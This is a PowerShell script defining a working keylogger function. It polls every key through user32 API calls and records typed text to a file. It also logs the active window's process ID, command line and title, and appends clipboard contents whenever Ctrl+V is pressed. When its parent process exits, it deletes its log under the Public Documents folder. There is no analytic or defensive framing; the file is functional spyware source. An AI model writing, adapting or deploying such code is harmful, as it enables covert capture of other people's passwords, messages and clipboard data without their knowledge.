function KeyLog($logfile) 
{
    $MAPVK_VK_TO_VSC = 0x00
    $MAPVK_VSC_TO_VK = 0x01
    $MAPVK_VK_TO_CHAR = 0x02
    $MAPVK_VSC_TO_VK_EX = 0x03
    $MAPVK_VK_TO_VSC_EX = 0x04
    
    $virtualkc_sig = @'
[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)] 
public static extern short GetAsyncKeyState(int virtualKeyCode); 
'@
    $kbstate_sig = @'
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int GetKeyboardState(byte[] keystate);
'@
    $mapchar_sig = @'
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int MapVirtualKey(uint uCode, int uMapType);
'@
    $tounicode_sig = @'
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);
'@
    $getwin_sig = @'
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int GetForegroundWindow();
'@

    $getKeyState = Add-Type -MemberDefinition $virtualkc_sig -name "Win32GetState" -namespace Win32Functions -passThru
    $getKBState = Add-Type -MemberDefinition $kbstate_sig -name "Win32MyGetKeyboardState" -namespace Win32Functions -passThru
    $getKey = Add-Type -MemberDefinition $mapchar_sig -name "Win32MyMapVirtualKey" -namespace Win32Functions -passThru
    $getUnicode = Add-Type -MemberDefinition $tounicode_sig -name "Win32MyToUnicode" -namespace Win32Functions -passThru
    $getWindow = Add-Type -MemberDefinition $getwin_sig -name "Win32MyGetForegroundWindow" -namespace Win32Functions -passThru

    $processId = $PID
    $parentProcessId = (Get-CimInstance -ClassName Win32_Process -Filter "ProcessId = $processId").ParentProcessId
    
    $chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
    $oldWindow = 0

    [Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms') | Out-Null
    
    while ($true) 
    {
        Start-Sleep -Milliseconds 20

        # Check if parent process is running
        if (-not (Get-Process -Id $parentProcessId -ErrorAction SilentlyContinue)) {
            $logPath = "c:\Users\Public\Documents\$($env:USERNAME)log.txt"
            if (Test-Path $logPath) {
                Remove-Item $logPath -Force
            }
            exit
        }
        
        $gotit = ""
        for ($char = 1; $char -le 254; $char++) 
        {
            $vkey = $char
            $gotit = $getKeyState::GetAsyncKeyState($vkey)	
            if ($gotit -eq -32767) 
            {	
                try
                {				
                    $l_shift = $getKeyState::GetAsyncKeyState(160)
                    $r_shift = $getKeyState::GetAsyncKeyState(161)
                    $l_ctrl = $getKeyState::GetAsyncKeyState(162)
                    $r_ctrl = $getKeyState::GetAsyncKeyState(163)
                    $caps_lock = [console]::CapsLock
                
                    $scancode = $getKey::MapVirtualKey($vkey, $MAPVK_VSC_TO_VK_EX)			
                    $kbstate = New-Object Byte[] 256
                    $checkkbstate = $getKBState::GetKeyboardState($kbstate)		
                    $mychar = New-Object -TypeName "System.Text.StringBuilder";
                    $unicode_res = $getUnicode::ToUnicode($vkey, $scancode, $kbstate, $mychar, $mychar.Capacity, 0)		
                    
                    if ($unicode_res -gt 0) 
                    {						
                        $topWindow = $getWindow::GetForegroundWindow()
                        if ($topWindow -ne $oldWindow) 
                        {
                            $time = Get-Date -format "dd/mm/yyyy HH:mm"
                            $oldWindow = $topWindow
                            $process = Get-Process | Where-Object { $_.MainWindowHandle -eq $topWindow }
                            [int]$pid = [int]$process.id
                            $process2 = Get-WmiObject Win32_Process -Filter "ProcessId = $pid"
                            $str = "`n`n====== " + $process.id + "|" + $process2.commandline + "|" + $process.mainWindowTitle + "|" + $time + " ======`n"
                            [System.IO.File]::AppendAllText($logfile, $str, [System.Text.Encoding]::Unicode)
                        }
                        if ($l_ctrl -or $r_ctrl)
                        {
                            [int]$c = [int]($mychar.toString().toCharArray()[0])
                            if ($c -gt 0 -and $c -lt 27){
                                $str = "[Ctrl+" + $chars[$c-1] + "]"
                            }
                            else{
                                $str = "[Ctrl+?]"
                            }
                            if ($c -eq 22)
                            {
                                if ([System.Windows.Forms.Clipboard]::GetText() -ne ""){    
                                    $str += "{" + [System.Windows.Forms.Clipboard]::GetText() + "}"  
                                }
                                else {
                                    $str += "{}"   
                                }
                            }
                            [System.IO.File]::AppendAllText($logfile, $str, [System.Text.Encoding]::Unicode)
                        }
                        else
                        {
                            [System.IO.File]::AppendAllText($logfile, $mychar, [System.Text.Encoding]::Unicode)
                        }					
                    }
                } catch { }
            }
        }
    }
}

# KeyLog -logfile "c:\Users\Public\Documents\log.txt"
